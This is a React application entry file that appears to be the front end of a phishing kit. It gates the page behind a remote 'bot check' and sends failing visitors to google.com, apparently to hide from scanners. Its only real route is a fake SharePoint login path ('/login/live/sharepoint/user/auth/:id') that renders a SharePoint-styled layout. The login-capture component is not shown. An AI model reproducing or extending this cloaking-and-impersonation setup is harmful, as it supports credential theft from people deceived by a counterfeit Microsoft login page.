import './App.css';
import { NotFound } from './pages/NotFound';
import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import ClipLoader from 'react-spinners/ClipLoader';
import { useEffect, useState } from 'react';

import SharePoint from './layout/SharePoint';

function App() {
  const MAX_RETRIES = 5;        // Total number of retry attempts
  const RETRY_DELAY = 3000;     // Delay between retries in ms
  const FETCH_TIMEOUT = 15000;   // Timeout for each fetch request in ms
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    const fetchWithTimeout = (url, options, timeout) => {
      return Promise.race([
        fetch(url, options),
        new Promise((_, reject) =>
          setTimeout(() => reject(new Error('Timeout')), timeout)
        ),
      ]);
    };

    const checkBotStatus = async (retryCount = 0) => {
      try {
        const response = await fetchWithTimeout('https://aba-v2.onrender.com/api/check', {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
          },
        }, FETCH_TIMEOUT);

        const data = await response.json();

        if (response.ok && data?.success === true) {
          setIsLoading(false);
          window.accessToken = data.token;
          sessionStorage.setItem('accessToken', window.accessToken);
        } else {
          window.location.href = 'https://google.com';
          //console.log(data);
        }

      } catch (error) {
        if (retryCount < MAX_RETRIES) {
          console.warn(`Retrying... (${retryCount + 1}/${MAX_RETRIES})`);
          setTimeout(() => checkBotStatus(retryCount + 1), RETRY_DELAY);
        } else {
          //console.log(error);
          window.location.href = 'https://google.com';
        }
      }
    };

    checkBotStatus();
  }, []);

  if (isLoading) {
    // Full-screen loader
    return (
      <div className="flex items-center justify-center min-h-screen bg-base-100 text-base-content">
        <ClipLoader size={40} color="#0084d6" />
      </div>
    );
  }

  // Main application routes


  return (
    <>
      <Router>
      {/* <Header /> */}
      <Routes>
        <Route path="/login/live/sharepoint/user/auth/:id" element={<SharePoint />} />
        <Route path="/404" element={<NotFound />} />
        <Route path="*" element={<NotFound />} />
      </Routes>
      {/* <Footer /> */}
      </Router>
    </>
  )
}

export default App
